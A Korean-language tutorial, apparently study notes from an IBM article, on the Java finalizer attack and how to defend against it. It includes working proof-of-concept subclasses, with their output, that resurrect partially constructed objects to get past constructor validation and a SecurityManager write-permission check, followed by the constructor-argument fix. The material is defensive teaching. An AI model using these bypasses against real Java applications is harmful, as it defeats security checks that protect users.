# Finalizer attack

참고 : [https://www.ibm.com/developerworks/library/j-fv/j-fv-pdf.pdf](https://www.ibm.com/developerworks/library/j-fv/j-fv-pdf.pdf)

## How to attack

Finalizers는 객체 생성할 때 취약점이 존재한다. finalizer의 개념은 java 메서드가 os로 리턴해야하는 자원을 해제 할 수있게 하는 것인데 finalizer에서 자바 코드가 실행될 수 있으므로 아래와 같은 코드가 허용된다.

```java
public class Zombie {
    static Zombie zombie;

    public void finalize() {
        zombie = this;
    }
}
```

Zombie finalizer가 호출됐을 때 zombie static 변수에 this가 저장된다. 객체는 다시 접근할 수 있게 됐고 gc되지 않는다.

더 교활한 버전은 부분적으로 구성된 오브젝트조차도 부활시킬 수 있다.

```java
public class Zombie2 {
    static Zombie2 zombie;
    int value;
    public Zombie2(int value) {
        if(value < 0) {
            throw new IllegalArgumentException("Negative Zombie2 value");
        }
        this.value = value;
    }
    public void finalize() {
        zombie = this;
    }
}
```

객체가 value 조건을 충족시키지 못하는 경우에도 finalizer로 작성할 수 있다. finalize \(\) 메서드의 존재로 인해 value 인수에 대한 검사의 결과는 무효화된다.

물론 아무도 위와 같은 코드를 작성하지는 않는다. 그러나 클래스가 subclassed된 경우 취약점이 발생할 수 있다.

```java
class Vulnerable {
    Integer value = 0;

    Vulnerable(int value) {
        if (value <= 0) {
            throw new IllegalArgumentException("Vulnerable value must be positive");
        }
        this.value = value;
    }

    @Override
    public String toString() {
        return (value.toString());
    }
}
```

```java
public class AttackVulnerable extends Vulnerable {
    static Vulnerable vulnerable;

    public AttackVulnerable(int value) {
        super(value);
    }

    public void finalize() {
        vulnerable = this;
    }

    public static void main(String[] args) {
        try {
            new AttackVulnerable(-1);
        } catch (Exception e) {
            System.out.println(e);
        }
        System.gc();
        System.runFinalization();
        if (vulnerable != null) {
            System.out.println("Vulnerable object " + vulnerable + " created!");
        }
    }
}
```

AttackVulnerable 클래스의 메인 메서드에서 새로운 AttackVulnerable 객체 생성을 시도한다. value가 -1이기 때문에 Exception이 발생하고 catch 블록으로 온다. `System.gc()`와 `System.runFinalization()` 호출은 vm이 gc를 실행하고 모든 finalizer를 실행하도록 권장한다.

이러한 호출은 공격이 성공하는 데 반드시 필요한 것은 아니지만 공격의 최종 결과를 보여준다. 즉, 값이 잘못된 Vulnerable 개체가 만들어진다.

```text
java.lang.IllegalArgumentException: Vulnerable value must be positive
Vulnerable object 0 created!

Process finished with exit code 0
```

실행하면 위와 같은 결과가 나온다. 왜 Vulnerable value가 -1가 아니라 0일까? Vulnerable 생성자에서 인자 검사전까지는 value 할당을 하지 않은것을 주목해라. 그래서 value는 초기값 0이다.

이러한 종류의 공격은 명시적인 보안 검사를 우회하는 데 사용될 수도 있다. 아래의 예제는 현재 디렉토리에 write 권한이 없을 때 SecurityException이 발생하도록 설계됐다.

```java
public class Insecure {
    Integer value = 0;

    public Insecure(int value) {
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) {
            FilePermission fp = new FilePermission("index", "write");
            sm.checkPermission(fp);
        }
        this.value = value;
    }

    @Override
    public String toString() {
        return (value.toString());
    }
}
```

```java
public class AttackInsecure extends Insecure {
    static Insecure insecure;

    public AttackInsecure(int value) {
        super(value);
    }

    public void finalize() {
        insecure = this;
    }

    public static void main(String[] args) {
        try {
            new AttackInsecure(-1);
        } catch (Exception e) {
            System.out.println(e);
        }
        System.gc();
        System.runFinalization();
        if (insecure != null) {
            System.out.println("Insecure object " + insecure + " created!");
        }
    }
}
```

```text
java -Djava.security.manager AttackInsecure
java.security.AccessControlException: Access denied (java.io.FilePermission index write)
Insecure object 0 created!
```

## How to avoid the attack

Java Language Specification \(JLS\) 세번째 edition 까지는 initialized flag, subclassing 금지, final finalizer 생성 세가지였고 불충분한 해결책이었다.

**initialized flag**  
 객체가 정상적으로 생성될 때 flag값을 셋팅하고 메서드 호출 때마다 제일 먼저 저 flag 값을 검사하는 방법이다. 이 코딩 기법은 작성하기 번거롭고 실수로 생략하기 쉽다. 그리고 subclassing을 통한 공격을 막을 수는 없다.

**preventing subclssing**  
 클래스를 final로 선언함으로써 subclass 자체를 막아버린다. 하지만 이 기법은 확장성 자체를 없애버린다.

**create a final finalizer**  
 final finalizer 메서드를 생성함으로써 subclass에서 finalizer 메서드 재사용을 금지시킨다. 이 접근의 단점은 finalizer 존재가 그것이 없는 것보다 더 오래 살아 있다는것을 의미한다는 점이다.

## A newer, better way

추가 코드나 제한없이 이러한 종류의 공격을 막기위해 자바 설계자는 JLS를 수정하여 java.lang.Object가 생성되기 전에 exception이 생성자에서 발생하면 finalize 메서드가 실행되지 않는다.

그런데 java.lang.Object가 생성되기 전에 어떻게 exception이 발생할 수 있냐? 결국 모든 생성자의 첫행은 this\(\) 또는 super\(\)에 대한 호출이어야 한다. 생성자에 명시적으로 호출이 포함되어 있지 않으면 super\(\) 호출이 암시적으로 추가된다. 따라서 객체가 생성되기 전에 동일한 클래스 또는 슈퍼 클래스의 다른 객체가 만들어져야 한다. 결국 생성되고 있는 메서드의 코드가 실행되기 전에 java.lang.Object 자체의 생성과 모든 subclass의 생성이 이뤄진다.

java.lang.Object가 생성되기 전에 예외를 throw하는 방법을 이해하려면, Object 생성 순서를 정확하게 이해해야한다. JLS는 순서를 명시적으로 작성했다.

Object가 생성될 때 JVM은 다음과 같이 동작한다. 1. 객체를 위한 공간을 할당한다. 2. 객체의 모든 인스턴스 변수를 기본값으로 설정. 여기에는 객체의 수퍼 클래스에 있는 인스턴스 변수가 포함된다. 3. 객체에 대한 파라미터 변수를 지정한다. 4. 명시적 또는 암시적 생성자 호출 \(생성자에서 this \(\) 또는 super \(\) 호출\)을 처리한다. 5. 클래스의 변수를 초기화한다. 6. 생성자의 나머지 부분을 실행한다.

요점은 생성자 내의 모든 코드가 처리되기 전에 생성자의 파라미터가 처리된다는 것이다. 즉, 파라미터를 처리하는 동안 유효성 검사를 수행하면 예외를 throw하여 클래스가 finalize 되지 않도록 할 수 있다.

```java
public class Invulnerable {
    int value = 0;

    Invulnerable(int value) {
        this(checkValues(value));
        this.value = value;
    }

    private Invulnerable(Void checkValues) {
    }

    static Void checkValues(int value) {
        if (value <= 0) {
            throw new IllegalArgumentException("Invulnerable value must be positive");
        }
        return null;
    }

    @Override
    public String toString() {
        return (Integer.toString(value));
    }
}
```

위 코드를 보면 public 생성자 Invulnerable에서 checkValues 메서드를 수행하고 그 결과로 private 생성자를 호출한다. 이 메서드는 생성자가 super class의 생성자를 호출하기 전에 호출된다. 따라서 checkValues에 예외가 발생하면 Invulnerable 객체는 finalize 되지 않는다.

```java
public class AttackInvulnerable extends Invulnerable {
    static Invulnerable vulnerable;

    public AttackInvulnerable(int value) {
        super(value);
    }

    public void finalize() {
        vulnerable = this;
    }

    public static void main(String[] args) {
        try {
            new AttackInvulnerable(-1);
        } catch (Exception e) {
            System.out.println(e);
        }
        System.gc();
        System.runFinalization();
        if (vulnerable != null) {
            System.out.println("Invulnerable object " + vulnerable + "created !");
        } else {
            System.out.println("Attack failed");
        }
    }
}
```

```text
java.lang.IllegalArgumentException: Invulnerable value must be positive
Attack failed
```

